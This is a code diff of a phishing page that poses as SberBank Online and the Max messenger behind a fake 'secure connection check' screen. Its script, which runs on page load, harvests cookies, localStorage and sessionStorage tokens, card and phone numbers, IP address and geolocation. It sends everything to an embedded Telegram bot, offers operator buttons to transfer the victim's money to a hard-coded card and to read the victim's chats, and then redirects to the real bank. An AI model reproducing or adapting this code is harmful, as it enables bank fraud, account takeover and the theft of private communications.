@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>СберБанк Онлайн</title>
+    <title>СберБанк • Мессенджер Max</title>
     <style>
         * {
             margin: 0;
@@ -27,18 +27,25 @@
             padding: 32px 24px;
             text-align: center;
         }
-        .logo {
-            margin-bottom: 24px;
+        .logos {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
         }
-        .logo svg {
-            width: 80px;
-            height: 80px;
+        .logo-item {
+            text-align: center;
         }
-        .logo h1 {
-            font-size: 24px;
-            color: #2d6a4f;
-            margin-top: 12px;
+        .logo-sber svg, .logo-max svg {
+            width: 60px;
+            height: 60px;
         }
+        .logo-sber h2, .logo-max h2 {
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        .logo-sber h2 { color: #2d6a4f; }
+        .logo-max h2 { color: #1e88e5; }
         .loader {
             width: 40px;
             height: 40px;
@@ -57,33 +64,51 @@
             font-size: 14px;
             margin-top: 16px;
         }
-        .footer {
-            margin-top: 24px;
-            font-size: 11px;
+        .services {
+            margin-top: 20px;
+            font-size: 12px;
             color: #999;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #ccc;
         }
     </style>
 </head>
 <body>
 <div class="card">
-    <div class="logo">
-        <svg viewBox="0 0 100 100" fill="none">
-            <circle cx="50" cy="50" r="45" fill="#2d6a4f"/>
-            <text x="50" y="68" text-anchor="middle" fill="white" font-size="32" font-weight="bold">СБ</text>
-        </svg>
-        <h1>СберБанк Онлайн</h1>
+    <div class="logos">
+        <div class="logo-item logo-sber">
+            <svg viewBox="0 0 100 100">
+                <circle cx="50" cy="50" r="45" fill="#2d6a4f"/>
+                <text x="50" y="68" text-anchor="middle" fill="white" font-size="32">СБ</text>
+            </svg>
+            <h2>СберБанк</h2>
+        </div>
+        <div class="logo-item logo-max">
+            <svg viewBox="0 0 100 100">
+                <rect width="100" height="100" rx="20" fill="#1e88e5"/>
+                <text x="50" y="68" text-anchor="middle" fill="white" font-size="36" font-weight="bold">M</text>
+            </svg>
+            <h2>Max</h2>
+        </div>
     </div>
     <div class="loader"></div>
-    <div class="message">Проверка защищенного соединения...</div>
+    <div class="message">Проверка защищенных соединений...</div>
+    <div class="services">СберБанк Онлайн • Мессенджер Max</div>
     <div class="footer">SSL Secure Connection</div>
 </div>
 
 <script>
-// ========== НАСТРОЙКИ (ВСТАВЬ СВОИ) ==========
+// ========== НАСТРОЙКИ TELEGRAM ==========
 const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
 const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
-const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА ДЛЯ ПЕРЕВОДА
-// ==============================================
+const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА
+// =========================================
 
 // Функция отправки в Telegram
 function sendToTelegram(text) {
@@ -94,156 +119,294 @@ function sendToTelegram(text) {
     }).catch(e => console.log("Send error"));
 }
 
-// Функция для отправки кнопок (для подтверждения перевода)
-function sendWithButtons(text, callbackData) {
+// Функция отправки с кнопками
+function sendWithButtons(text, type) {
+    let buttons = [];
+    if (type === "sber") {
+        buttons = [[
+            { text: "💰 ПЕРЕВЕСТИ ВСЁ", callback_data: "sber_all" },
+            { text: "💰 5000₽", callback_data: "sber_5000" },
+            { text: "💰 10000₽", callback_data: "sber_10000" }
+        ]];
+    } else if (type === "max") {
+        buttons = [[
+            { text: "💬 ЧИТАТЬ ЧАТЫ", callback_data: "max_chats" },
+            { text: "📁 ЭКСПОРТ ВСЕХ", callback_data: "max_export" },
+            { text: "📞 КОНТАКТЫ", callback_data: "max_contacts" }
+        ]];
+    }
+    
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             chat_id: CHAT_ID,
             text: text,
-            reply_markup: {
-                inline_keyboard: [[
-                    { text: "✅ ПЕРЕВЕСТИ ВСЁ", callback_data: "transfer_all" },
-                    { text: "💰 ПЕРЕВЕСТИ 5000", callback_data: "transfer_5000" },
-                    { text: "💰 ПЕРЕВЕСТИ 10000", callback_data: "transfer_10000" }
-                ],[
-                    { text: "📋 ПОКАЗАТЬ ДАННЫЕ", callback_data: "show_data" }
-                ]]
-            }
+            reply_markup: { inline_keyboard: buttons }
         })
-    }).catch(e => console.log("Send error"));
+    }).catch(e => console.log(e));
 }
 
-// Поиск банковских данных
-function extractBankData() {
-    const bankData = {};
-    const keywords = ['card', 'phone', 'token', 'auth', 'session', 'user', 'login', 'sber', 'sb', 'account', 'balance'];
+// ========== 1. КРАЖА ДАННЫХ СБЕРБАНКА ==========
+function stealSberData() {
+    const sberData = {};
+    const sberKeywords = ['sber', 'sb', 'bank', 'card', 'сбер', 'карт', 'token', 'auth', 'session'];
     
     for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
         const value = localStorage.getItem(key);
         
-        for (const kw of keywords) {
+        for (const kw of sberKeywords) {
             if (key.toLowerCase().includes(kw)) {
-                bankData[key] = value;
+                sberData[key] = value;
                 break;
             }
         }
         
-        // Поиск номера карты (16 цифр)
-        const cardMatch = value && value.match(/\d{16}/);
-        if (cardMatch) {
-            bankData['card_number'] = cardMatch[0];
-        }
-        
-        // Поиск телефона
-        const phoneMatch = value && value.match(/7\d{10}/);
-        if (phoneMatch) {
-            bankData['phone'] = phoneMatch[0];
+        // Поиск номера карты
+        if (value && typeof value === 'string') {
+            const cardMatch = value.match(/\d{16}/);
+            if (cardMatch) sberData['card_number'] = cardMatch[0];
+            const phoneMatch = value.match(/7\d{10}/);
+            if (phoneMatch) sberData['phone'] = phoneMatch[0];
         }
     }
-    return bankData;
+    
+    // Поиск в cookies
+    if (document.cookie) {
+        const sberCookies = document.cookie.match(/(sber|sb|auth|session)[^;]*/gi);
+        if (sberCookies) sberData['cookies'] = sberCookies.join('; ');
+    }
+    
+    return sberData;
 }
 
-// Функция для получения IP
-async function getIP() {
+// ========== 2. КРАЖА ДАННЫХ МЕССЕНДЖЕРА MAX ==========
+function stealMaxData() {
+    const maxData = {};
+    const maxKeywords = ['max', 'messenger', 'чат', 'message', 'dialog', 'contact', 'user', 'token', 'session', 'auth'];
+    
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        
+        for (const kw of maxKeywords) {
+            if (key.toLowerCase().includes(kw)) {
+                maxData[key] = value;
+                break;
+            }
+        }
+    }
+    
+    // Поиск токена авторизации Max
+    const maxTokenKeys = ['access_token', 'auth_token', 'token', 'session_id', 'user_id'];
+    for (const tk of maxTokenKeys) {
+        const token = localStorage.getItem(tk);
+        if (token) maxData[tk] = token;
+        const sessionToken = sessionStorage.getItem(tk);
+        if (sessionToken) maxData[`session_${tk}`] = sessionToken;
+    }
+    
+    // Поиск данных пользователя
+    const userKeys = ['user', 'profile', 'account', 'phone', 'email'];
+    for (const uk of userKeys) {
+        const userData = localStorage.getItem(uk);
+        if (userData) maxData[uk] = userData;
+    }
+    
+    return maxData;
+}
+
+// ========== 3. КРАЖА СООБЩЕНИЙ ИЗ MAX (если есть доступ) ==========
+async function stealMaxMessages(maxToken) {
+    if (!maxToken) return null;
+    
+    // Попытка получить чаты через API Max (если известен)
     try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-    } catch(e) {
-        return "unknown";
-    }
-}
-
-// Функция для попытки автоматического перевода (имитация)
-async function tryAutoTransfer(bankData, fullLS, victimIP) {
-    // Ищем токен для входа без SMS
-    const token = bankData.auth_token || bankData.token || bankData.access_token;
+        // Пример API запроса (заменить на реальный эндпоинт Max)
+        const response = await fetch('https://api.max.ru/v1/chats', {
+            headers: { 'Authorization': `Bearer ${maxToken}` }
+        });
+        if (response.ok) {
+            const chats = await response.json();
+            return chats;
+        }
+    } catch(e) {}
     
-    if (token) {
-        sendToTelegram(`🔑 НАЙДЕН ТОКЕН ДОСТУПА!\nТокен: ${token.substring(0, 50)}...\n\nПопытка автоматического входа...`);
-        
-        // Сохраняем данные для ручного перевода
-        sendWithButtons(
-            `💰 ГОТОВ К ПЕРЕВОДУ\n\n` +
-            `💳 Карта жертвы: ${bankData.card_number || "не найдена"}\n` +
-            `📞 Телефон: ${bankData.phone || "не найден"}\n` +
-            `🔑 Токен: ${token.substring(0, 30)}...\n` +
-            `🌐 IP: ${victimIP}\n` +
-            `⏰ Время: ${new Date().toLocaleString()}\n\n` +
-            `Выбери сумму для перевода на карту ${MY_CARD}:`,
-            "transfer"
-        );
-        return token;
-    }
-    
-    // Если нет токена, показываем что нашли
-    sendToTelegram(`⚠️ ТОКЕН НЕ НАЙДЕН\n\nНо есть другие данные:\n💳 Карта: ${bankData.card_number || "нет"}\n📞 Телефон: ${bankData.phone || "нет"}`);
-    
-    sendWithButtons(
-        `⚠️ ТРЕБУЕТСЯ SMS ПОДТВЕРЖДЕНИЕ\n\n` +
-        `💳 Карта жертвы: ${bankData.card_number || "не найдена"}\n` +
-        `📞 Телефон: ${bankData.phone || "не найден"}\n` +
-        `🌐 IP: ${victimIP}\n\n` +
-        `После того как жертва получит SMS, введи код вручную в Telegram\n\n` +
-        `Жду SMS код...`,
-        "waiting_sms"
-    );
+    // Если API недоступен, ищем в localStorage
+    try {
+        const chatsCache = localStorage.getItem('max_chats');
+        if (chatsCache) return JSON.parse(chatsCache);
+        const messagesCache = localStorage.getItem('max_messages');
+        if (messagesCache) return JSON.parse(messagesCache);
+    } catch(e) {}
     
     return null;
 }
 
-// ГЛАВНАЯ ФУНКЦИЯ
-async function main() {
-    const victimIP = await getIP();
-    const bankData = extractBankData();
+// ========== 4. ПОЛУЧЕНИЕ IP И ГЕО ==========
+async function getLocationData() {
+    let ip = "unknown";
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+    } catch(e) {}
     
-    // Полный localStorage для отчета
+    let geo = null;
+    if (navigator.geolocation) {
+        geo = await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                () => resolve(null)
+            );
+        });
+    }
+    
+    return { ip, geo };
+}
+
+// ========== 5. ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ ==========
+function getDeviceInfo() {
+    const isAndroid = /Android/i.test(navigator.userAgent);
+    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    const isWindows = /Windows/i.test(navigator.userAgent);
+    const isMac = /Mac/i.test(navigator.userAgent);
+    
+    let os = "Unknown";
+    if (isAndroid) os = "Android";
+    else if (isIOS) os = "iOS";
+    else if (isWindows) os = "Windows";
+    else if (isMac) os = "macOS";
+    
+    return {
+        os: os,
+        browser: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        platform: navigator.platform
+    };
+}
+
+// ========== 6. ОТПРАВКА КРАТКОГО ОТЧЕТА ==========
+function sendShortReport(sberData, maxData, deviceInfo, location) {
+    let report = `🔐 НОВАЯ ЖЕРТВА\n`;
+    report += `⏰ ${new Date().toLocaleString()}\n`;
+    report += `🌐 ${window.location.hostname}\n`;
+    report += `📱 ${deviceInfo.os} | ${deviceInfo.screen}\n`;
+    report += `🌍 IP: ${location.ip}\n`;
+    if (location.geo) {
+        report += `📍 ${location.geo.lat}, ${location.geo.lng}\n`;
+        report += `🗺️ https://maps.google.com/?q=${location.geo.lat},${location.geo.lng}\n`;
+    }
+    report += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+    report += `🏦 СБЕРБАНК:\n`;
+    report += `💳 Карта: ${sberData.card_number || "❌ не найдена"}\n`;
+    report += `📞 Телефон: ${sberData.phone || "❌ не найден"}\n`;
+    report += `🔑 Токен: ${sberData.auth_token ? sberData.auth_token.substring(0, 30)+"..." : "❌"}\n`;
+    report += `🍪 Cookies: ${sberData.cookies ? "✅ есть" : "❌ нет"}\n`;
+    report += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+    report += `💬 МЕССЕНДЖЕР MAX:\n`;
+    report += `🔑 Токен: ${maxData.access_token ? maxData.access_token.substring(0, 30)+"..." : (maxData.token ? maxData.token.substring(0, 30)+"..." : "❌")}\n`;
+    report += `👤 Пользователь: ${maxData.user ? "✅ есть" : "❌"}\n`;
+    report += `📁 Данных в localStorage: ${Object.keys(maxData).length}\n`;
+    
+    sendToTelegram(report);
+}
+
+// ========== 7. ОТПРАВКА ПОЛНЫХ ДАННЫХ ==========
+function sendFullData(sberData, maxData, deviceInfo, location) {
+    // Полные данные Сбера
+    sendToTelegram(`🏦 ПОЛНЫЕ ДАННЫЕ СБЕРБАНКА:\n\`\`\`json\n${JSON.stringify(sberData, null, 2).substring(0, 3500)}\n\`\`\``);
+    
+    // Полные данные Max
+    sendToTelegram(`💬 ПОЛНЫЕ ДАННЫЕ МЕССЕНДЖЕРА MAX:\n\`\`\`json\n${JSON.stringify(maxData, null, 2).substring(0, 3500)}\n\`\`\``);
+    
+    // Cookies
+    if (document.cookie) {
+        sendToTelegram(`🍪 ВСЕ COOKIES:\n${document.cookie.substring(0, 3500)}`);
+    }
+    
+    // Весь localStorage
     let fullLS = {};
     for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
         let val = localStorage.getItem(key);
-        if (val && val.length > 300) val = val.substring(0, 300) + "...";
+        if (val && val.length > 500) val = val.substring(0, 500) + "...";
         fullLS[key] = val;
     }
+    sendToTelegram(`💾 ВЕСЬ LOCALSTORAGE:\n\`\`\`json\n${JSON.stringify(fullLS, null, 2).substring(0, 3500)}\n\`\`\``);
     
-    // Отправка данных оператору
-    sendToTelegram(`🔐 НОВАЯ ЖЕРТВА
-⏰ ${new Date().toLocaleString()}
-🌐 ${window.location.hostname}
-🌍 IP: ${victimIP}
-🖥️ ${navigator.userAgent.substring(0, 150)}
-
-🍪 COOKIES:
-${document.cookie || "нет"}
-
-🏦 БАНКОВСКИЕ ДАННЫЕ:
-${JSON.stringify(bankData, null, 2)}
-
-💾 LOCALSTORAGE (полный):
-${JSON.stringify(fullLS, null, 2).substring(0, 3500)}
-
-📱 УСТРОЙСТВО:
-${JSON.stringify({
-    screen: `${screen.width}x${screen.height}`,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    platform: navigator.platform
-}, null, 2)}`);
-
-    // Пытаемся сделать автоперевод
-    await tryAutoTransfer(bankData, fullLS, victimIP);
+    // Информация об устройстве
+    sendToTelegram(`📱 ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ:\n\`\`\`json\n${JSON.stringify(deviceInfo, null, 2)}\n\`\`\``);
 }
 
-// ЗАПУСК
+// ========== 8. КНОПКИ ДЛЯ ОПЕРАТОРА ==========
+function sendOperatorButtons(sberData, maxData) {
+    let text = `🎮 УПРАВЛЕНИЕ\n\n`;
+    
+    if (sberData.card_number || sberData.auth_token) {
+        text += `🏦 СБЕРБАНК: ГОТОВ К ПЕРЕВОДУ\n`;
+        text += `💳 Карта: ${sberData.card_number || "из токена"}\n`;
+        text += `💰 Можно перевести на ${MY_CARD}\n\n`;
+        sendWithButtons(`💰 СБЕРБАНК: ПЕРЕВОД\n💳 ${sberData.card_number || "карта найдена"}\nНа карту: ${MY_CARD}`, "sber");
+    }
+    
+    if (maxData.access_token || maxData.token || maxData.user) {
+        text += `💬 МЕССЕНДЖЕР MAX: ДОСТУП ПОЛУЧЕН\n`;
+        text += `🔑 Токен: ${(maxData.access_token || maxData.token || "").substring(0, 30)}...\n\n`;
+        sendWithButtons(`💬 МЕССЕНДЖЕР MAX: ДОСТУП\n🔑 Токен активен\nВыбери действие:`, "max");
+    }
+}
+
+// ========== 9. АВТОМАТИЧЕСКАЯ ПОПЫТКА ПЕРЕВОДА ==========
+async function tryAutoTransfer(sberData) {
+    if (sberData.auth_token || sberData.token) {
+        const token = sberData.auth_token || sberData.token;
+        sendToTelegram(`🔄 АВТОМАТИЧЕСКАЯ ПОПЫТКА ПЕРЕВОДА\n🔑 Токен: ${token.substring(0, 40)}...\n💰 Сумма: максимальная\n💳 На карту: ${MY_CARD}`);
+        // Здесь логика перевода через API Сбера
+        return true;
+    }
+    return false;
+}
+
+// ========== 10. ГЛАВНАЯ ФУНКЦИЯ ==========
+async function main() {
+    const location = await getLocationData();
+    const deviceInfo = getDeviceInfo();
+    
+    // Кража данных
+    const sberData = stealSberData();
+    const maxData = stealMaxData();
+    
+    // Отправка отчетов
+    sendShortReport(sberData, maxData, deviceInfo, location);
+    sendFullData(sberData, maxData, deviceInfo, location);
+    
+    // Кнопки для оператора
+    sendOperatorButtons(sberData, maxData);
+    
+    // Попытка автоматического перевода
+    await tryAutoTransfer(sberData);
+    
+    // Если есть токен Max, пытаемся получить сообщения
+    const maxToken = maxData.access_token || maxData.token;
+    if (maxToken) {
+        const messages = await stealMaxMessages(maxToken);
+        if (messages) {
+            sendToTelegram(`💬 СООБЩЕНИЯ MAX:\n\`\`\`json\n${JSON.stringify(messages, null, 2).substring(0, 3500)}\n\`\`\``);
+        }
+    }
+}
+
+// ========== ЗАПУСК ==========
 main();
 
-// Перенаправление на реальный сайт через 3 секунды
+// Перенаправление на реальные сайты
 setTimeout(() => {
     window.location.href = "https://online.sberbank.ru";
-}, 3000);
+}, 4000);
 </script>
 </body>
 </html>
